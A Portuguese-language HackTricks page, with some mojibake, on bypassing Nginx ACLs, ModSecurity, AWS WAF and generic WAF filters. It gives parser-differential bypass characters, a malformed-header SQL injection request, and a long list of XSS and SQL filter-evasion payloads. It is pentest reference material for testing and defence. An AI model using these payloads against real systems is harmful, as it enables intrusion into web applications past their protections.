# Proxy / WAF Protections Bypass

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

T√©cnicas [desta pesquisa](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Exemplo de regra Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Para evitar bypasses, o Nginx realiza a normaliza√ß√£o de caminho antes de verific√°-lo. No entanto, se o servidor backend realizar uma normaliza√ß√£o diferente (removendo caracteres que o Nginx n√£o remove), pode ser poss√≠vel contornar essa defesa.

### **NodeJS - Express**

| Vers√£o do Nginx | **Caracteres de Bypass do Node.js** |
| --------------- | ------------------------------------ |
| 1.22.0         | `\xA0`                               |
| 1.21.6         | `\xA0`                               |
| 1.20.2         | `\xA0`, `\x09`, `\x0C`               |
| 1.18.0         | `\xA0`, `\x09`, `\x0C`               |
| 1.16.1         | `\xA0`, `\x09`, `\x0C`               |

### **Flask**

| Vers√£o do Nginx | **Caracteres de Bypass do Flask**                                   |
| --------------- | ------------------------------------------------------------------- |
| 1.22.0         | `\x85`, `\xA0`                                                      |
| 1.21.6         | `\x85`, `\xA0`                                                      |
| 1.20.2         | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`    |
| 1.18.0         | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`    |
| 1.16.1         | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`    |

### **Spring Boot**

| Vers√£o do Nginx | **Caracteres de Bypass do Spring Boot** |
| --------------- | ---------------------------------------- |
| 1.22.0         | `;`                                      |
| 1.21.6         | `;`                                      |
| 1.20.2         | `\x09`, `;`                              |
| 1.18.0         | `\x09`, `;`                              |
| 1.16.1         | `\x09`, `;`                              |

### **PHP-FPM**

Configura√ß√£o do Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx est√° configurado para bloquear o acesso a `/admin.php`, mas √© poss√≠vel contornar isso acessando `/admin.php/index.php`.

### Como prevenir
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**Neste post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) √© explicado que o ModSecurity v3 (at√© 3.0.12), **implementou incorretamente a vari√°vel `REQUEST_FILENAME`** que deveria conter o caminho acessado (at√© o in√≠cio dos par√¢metros). Isso ocorre porque ele realizava uma decodifica√ß√£o de URL para obter o caminho.\
Portanto, uma solicita√ß√£o como `http://example.com/foo%3f';alert(1);foo=` no mod security supor√° que o caminho √© apenas `/foo` porque `%3f` √© transformado em `?`, encerrando o caminho da URL, mas na verdade o caminho que um servidor receber√° ser√° `/foo%3f';alert(1);foo=`.

As vari√°veis `REQUEST_BASENAME` e `PATH_INFO` tamb√©m foram afetadas por esse bug.

Algo semelhante ocorreu na vers√£o 2 do Mod Security que permitiu contornar uma prote√ß√£o que impedia o acesso do usu√°rio a arquivos com extens√µes espec√≠ficas relacionadas a arquivos de backup (como `.bak`) simplesmente enviando o ponto codificado em URL como `%2e`, por exemplo: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Esta pesquisa](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) menciona que era poss√≠vel contornar as regras do AWS WAF aplicadas sobre cabe√ßalhos HTTP enviando um cabe√ßalho "malformado" que n√£o era devidamente analisado pela AWS, mas sim pelo servidor backend.

Por exemplo, enviando a seguinte solicita√ß√£o com uma inje√ß√£o SQL no cabe√ßalho X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Foi poss√≠vel contornar o AWS WAF porque ele n√£o entendia que a pr√≥xima linha faz parte do valor do cabe√ßalho, enquanto o servidor NODEJS entendia (isso foi corrigido).

## Bypasses gen√©ricos de WAF

### Limites de Tamanho de Requisi√ß√£o

Comumente, os WAFs t√™m um certo limite de comprimento de requisi√ß√µes para verificar e, se uma requisi√ß√£o POST/PUT/PATCH ultrapassar esse limite, o WAF n√£o verificar√° a requisi√ß√£o.

* Para o AWS WAF, voc√™ pode [**verificar a documenta√ß√£o**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Tamanho m√°ximo de um corpo de requisi√ß√£o web que pode ser inspecionado para prote√ß√µes do Application Load Balancer e AWS AppSync</td><td>8 KB</td></tr><tr><td>Tamanho m√°ximo de um corpo de requisi√ß√£o web que pode ser inspecionado para prote√ß√µes do CloudFront, API Gateway, Amazon Cognito, App Runner e Verified Access**</td><td>64 KB</td></tr></tbody></table>

* De [**documentos do Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Firewalls de Aplica√ß√£o Web mais antigos com Core Rule Set 3.1 (ou inferior) permitem mensagens maiores que **128 KB** desativando a inspe√ß√£o do corpo da requisi√ß√£o, mas essas mensagens n√£o ser√£o verificadas quanto a vulnerabilidades. Para vers√µes mais novas (Core Rule Set 3.2 ou mais recentes), o mesmo pode ser feito desativando o limite m√°ximo do corpo da requisi√ß√£o. Quando uma requisi√ß√£o excede o limite de tamanho:

Se **modo de preven√ß√£o**: Registra e bloqueia a requisi√ß√£o.\
Se **modo de detec√ß√£o**: Inspeciona at√© o limite, ignora o restante e registra se o `Content-Length` exceder o limite.

* De [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Por padr√£o, o WAF inspeciona apenas os primeiros 8KB de uma requisi√ß√£o. Ele pode aumentar o limite para at√© 128KB adicionando Metadados Avan√ßados.

* De [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

At√© 128KB.

### Ofusca√ß√£o <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Compatibilidade Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

Dependendo da implementa√ß√£o da normaliza√ß√£o Unicode (mais informa√ß√µes [aqui](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), caracteres que compartilham compatibilidade Unicode podem ser capazes de contornar o WAF e executar como a carga √∫til pretendida. Caracteres compat√≠veis podem ser encontrados [aqui](https://www.compart.com/en/unicode).

#### Exemplo <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
Ôºúimg src‚Åºp onerror‚ÅºÔºáprompt‚ÅΩ1‚ÅæÔºáÔπ•  --> Ôºúimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### Rota√ß√£o de IP <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Gere uma URL de gateway de API para ser usada com ffuf
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Semelhante ao fireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Plugin do Burp Suite que usa IPs de gateway de API
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Um n√∫mero dinamicamente determinado de inst√¢ncias de cont√™iner √© ativado com base no tamanho do arquivo de entrada e no fator de divis√£o, com a entrada dividida em partes para execu√ß√£o paralela, como 100 inst√¢ncias processando 100 partes de um arquivo de entrada de 10.000 linhas com um fator de divis√£o de 100 linhas.

### Bypasses de Regex

T√©cnicas diferentes podem ser usadas para contornar os filtros de regex nos firewalls. Exemplos incluem alternar mai√∫sculas e min√∫sculas, adicionar quebras de linha e codificar cargas √∫teis. Recursos para os v√°rios bypasses podem ser encontrados em [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) e [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). Os exemplos abaixo foram retirados [deste artigo](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Ferramentas

* [**nowafpls**](https://github.com/assetnote/nowafpls): Plugin do Burp para adicionar dados aleat√≥rios √†s requisi√ß√µes para contornar WAFs por comprimento

## Refer√™ncias

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
